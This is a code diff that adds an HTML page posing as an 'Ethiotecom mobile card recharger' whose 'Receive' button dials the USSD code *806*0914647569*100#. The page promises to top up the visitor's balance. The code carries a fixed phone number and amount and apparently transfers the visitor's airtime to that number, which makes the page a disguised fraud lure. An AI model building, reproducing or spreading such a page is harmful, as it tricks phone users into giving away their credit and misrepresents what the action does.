@@ -1,6 +1,53 @@
-}<style>
-botton
-{background-color: green;}
-</style>
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Dial USSD Code</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #f4f4f4;
+            text-align: center;
+            padding: 50px;
+        }
+        h1 {
+            color: #333;
+        }
+        p {
+            color: #555;
+        }
+        button {
+            background-color: #28a745; /* Green background */
+            color: white; /* White text */
+            border: none; /* No border */
+            padding: 15px 30px; /* Padding around the text */
+            font-size: 16px; /* Font size */
+            cursor: pointer; /* Pointer cursor on hover */
+            border-radius: 50px; /* Rounded corners */
+            transition: background-color 0.3s; /* Smooth transition */
+        }
+        button:hover {
+            background-color: #1e7e34; /* Darker green on hover */
+        }
+    </style>
+</head>
+<body>
+    <h1>Ethiotecom mobile card recharger</h1>
+    <p>Click the button below to recharge your phone balance.</p>
+    <button onclick="dialCode('*806*0914647569*100#')">Receive</button>
 
-<bottn>LIKE</botton>
+    <script>
+        function dialCode(code) {
+            // Encode the USSD code for proper URL formatting
+            const encodedCode = encodeURIComponent(code);
+
+            // Create the tel: URL with the encoded USSD code
+            const telURL = `tel:${encodedCode}`;
+
+            // Open the tel: URL, which should trigger the phone dialer
+            window.location.href = telURL;
+        }
+    </script>
+</body>
+</html>
